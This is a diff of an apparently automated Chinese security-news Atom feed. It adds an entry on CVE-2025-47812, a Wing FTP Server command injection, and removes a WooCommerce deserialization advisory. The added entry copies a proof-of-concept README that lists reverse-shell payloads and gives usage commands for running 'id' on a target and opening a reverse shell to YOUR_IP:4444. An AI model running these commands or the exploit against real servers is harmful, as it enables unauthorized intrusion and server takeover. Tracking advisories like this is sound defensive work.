@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-04T16:01:04.276Z</updated>
+  <updated>2025-07-04T16:45:23.435Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Wing FTP Server Remote Command Execution Vulnerability</title>
+    <link href="http://example.com/2025/07/04/github_1748189813/"/>
+    <id>http://example.com/2025/07/04/github_1748189813/</id>
+    <published>2025-07-04T16:45:23.000Z</published>
+    <updated>2025-07-04T16:45:23.435Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Wing FTP Server Remote Command Execution Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-47812</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Wing FTP Server是一款广泛使用的FTP服务器软件，支持多种操作系统，常用于企业文件传输和共享服务。由于其易用性和功能丰富，被许多组织用于日常的文件管理任务。此次发现的远程命令执行（RCE）漏洞（CVE-2025-47812）允许攻击者通过认证过程中的<code>username</code>参数注入并执行任意Lua-based系统命令，从而实现完全的远程代码执行。</p><p>该漏洞的技术根源在于Wing FTP Server在处理用户认证请求时，未能对<code>username</code>参数进行充分的输入验证和过滤，导致攻击者可以构造恶意的用户名参数，注入并执行任意命令。这种类型的漏洞通常由于开发过程中对用户输入的处理不当，未能实施严格的安全措施所致。</p><p>利用此漏洞，攻击者可以在未授权的情况下远程执行任意命令，可能导致服务器被完全控制，敏感数据泄露，服务中断等严重后果。由于漏洞利用不需要复杂的交互，且可以通过自动化工具批量攻击，因此对使用受影响版本Wing FTP Server的用户构成了严重的安全威胁。建议所有用户立即检查并更新到最新版本，以避免潜在的安全风险。</p><p><strong>产品厂商：</strong> Wing FTP Server</p><p><strong>产品名称：</strong> Wing FTP Server</p><p><strong>来源：</strong> <a href="https://github.com/ill-deed/WingFTP-CVE-2025-47812-illdeed">https://github.com/ill-deed/WingFTP-CVE-2025-47812-illdeed</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>LICENSE</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-47812-Wing-FTP-Server-RCE-Exploit"><a href="#CVE-2025-47812-Wing-FTP-Server-RCE-Exploit" class="headerlink" title="CVE-2025-47812 - Wing FTP Server RCE Exploit"></a>CVE-2025-47812 - Wing FTP Server RCE Exploit</h2><p>This repository provides a proof-of-concept exploit for <strong>CVE-2025-47812</strong>, a remote command execution (RCE) vulnerability in <strong>Wing FTP Server</strong>. An attacker can inject and execute arbitrary Lua-based system commands by abusing the <code>username</code> parameter during authentication, resulting in full remote code execution.</p><hr><h3 id="📌-Exploit-Features"><a href="#📌-Exploit-Features" class="headerlink" title="📌 Exploit Features"></a>📌 Exploit Features</h3><ul><li>🔧 Remote execution of custom shell commands</li><li>🧬 Multiple built-in reverse shell payloads (bash, Python, netcat, etc.)</li><li>🪪 Automatic UID extraction from Set-Cookie</li><li>📦 Logs successful UIDs to <code>found_uids.txt</code></li><li>🧪 Dry-run mode (no actual requests sent — test your input&#x2F;output logic safely)</li><li>🔁 Retry logic on network failure</li><li>🧹 Cleaner payload formatting and readable output</li><li>✅ Input validation for IPs, ports, and URLs</li><li>⚙️ Command-line argument support for automated workflows</li></ul><hr><h3 id="💻-Usage"><a href="#💻-Usage" class="headerlink" title="💻 Usage"></a>💻 Usage</h3><p><strong>Execute a simple shell command:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 exploit.py --url http://target:5466 --cmd <span class="hljs-string">&quot;id&quot;</span><br></code></pre></td></tr></table></figure><p>Trigger a reverse shell:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">python3 exploit.py <span class="hljs-params">--url</span> http:<span class="hljs-string">//target</span><span class="hljs-function">:5466</span> <span class="hljs-params">--reverse</span> <span class="hljs-params">--ip</span> YOUR_IP <span class="hljs-params">--port</span> 4444<br></code></pre></td></tr></table></figure><p>Dry-run mode (no requests will be sent):</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">python3 exploit.py <span class="hljs-params">--url</span> http:<span class="hljs-string">//target</span><span class="hljs-function">:5466</span> <span class="hljs-params">--cmd</span> <span class="hljs-string">&quot;whoami&quot;</span> <span class="hljs-params">--dry-run</span><br></code></pre></td></tr></table></figure><h3 id="🔄-Changes-Made-to-the-Original-Exploit"><a href="#🔄-Changes-Made-to-the-Original-Exploit" class="headerlink" title="🔄 Changes Made to the Original Exploit"></a>🔄 Changes Made to the Original Exploit</h3><table><thead><tr><th>Feature&#x2F;Improvement</th><th>Description</th></tr></thead><tbody><tr><td>✅ <strong>Argument Parsing</strong></td><td>Added <code>argparse</code> CLI support for non-interactive mode</td></tr><tr><td>🔐 <strong>Input Validation</strong></td><td>Ensures valid URL&#x2F;IP&#x2F;port before attempting exploit</td></tr><tr><td>📦 <strong>Header Refactoring</strong></td><td>Extracted HTTP headers into a reusable function for consistency</td></tr><tr><td>📄 <strong>UID Logging</strong></td><td>Saves successful UID tokens to <code>found_uids.txt</code></td></tr><tr><td>🧪 <strong>Dry-Run Mode</strong></td><td>Allows safe testing without sending requests (<code>--dry-run</code>)</td></tr><tr><td>🕒 <strong>Timeout + Retries</strong></td><td>Adds request timeout and automatic retry attempts on failure</td></tr><tr><td>🧼 <strong>Payload Readability</strong></td><td>Reformatted the Lua injection string for clarity and maintenance</td></tr><tr><td>📊 <strong>Structured Output</strong></td><td>Wrapped server responses and payload info with delimiters for easy reading</td></tr><tr><td>⚠️ <strong>Status Code Checks</strong></td><td>Warns user if the target returns unexpected HTTP status codes</td></tr><tr><td>📝 <strong>Logging System</strong></td><td>Replaces <code>print()</code> with Python <code>logging</code> module for better verbosity control</td></tr></tbody></table><hr><h3 id="⚠️-Disclaimer"><a href="#⚠️-Disclaimer" class="headerlink" title="⚠️ Disclaimer"></a>⚠️ Disclaimer</h3><p>This project is intended for <strong>educational and authorized security testing only</strong>.<br>Do <strong>not</strong> use this tool against systems you do not own or have explicit permission to test.</p><hr><hr>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Wing FTP Server Remote Command Executio</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+  </entry>
   
   <entry>
     <title>illdeed Twitter Update !</title>
@@ -496,30 +522,6 @@
       
       
     <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-3rxm-qjgx-2m73&quot;&gt;https://github.com/advisories/GHSA-3rxm-qjgx-2m73&lt;/a&gt;&lt;/p</summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Deserialization of Untrusted Data vulnerability in BestWpDeveloper WooCommerce Product Multi</title>
-    <link href="http://example.com/2025/07/04/github_2365357107/"/>
-    <id>http://example.com/2025/07/04/github_2365357107/</id>
-    <published>2025-07-04T13:00:07.000Z</published>
-    <updated>2025-07-04T13:00:07.666Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-fq9w-fp93-3f95">https://github.com/advisories/GHSA-fq9w-fp93-3f95</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49417">https://nvd.nist.gov/vuln/detail/CVE-2025-49417</a></p></li><li><p><a href="https://patchstack.com/database/wordpress/plugin/woo-product-multiaction/vulnerability/wordpress-woocommerce-product-multi-action-1-3-deserialization-of-untrusted-data-vulnerability?_s_id=cve">https://patchstack.com/database/wordpress/plugin/woo-product-multiaction/vulnerability/wordpress-woocommerce-product-multi-action-1-3-deserialization-of-untrusted-data-vulnerability?_s_id=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-fq9w-fp93-3f95">https://github.com/advisories/GHSA-fq9w-fp93-3f95</a></p></li></ul><p><strong>描述：</strong></p><p>Deserialization of Untrusted Data vulnerability in BestWpDeveloper WooCommerce Product Multi-Action allows Object Injection. This issue affects WooCommerce Product Multi-Action: from n&#x2F;a through 1.3.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-fq9w-fp93-3f95&quot;&gt;https://github.com/advisories/GHSA-fq9w-fp93-3f95&lt;/a&gt;&lt;/p</summary>
       
     
     
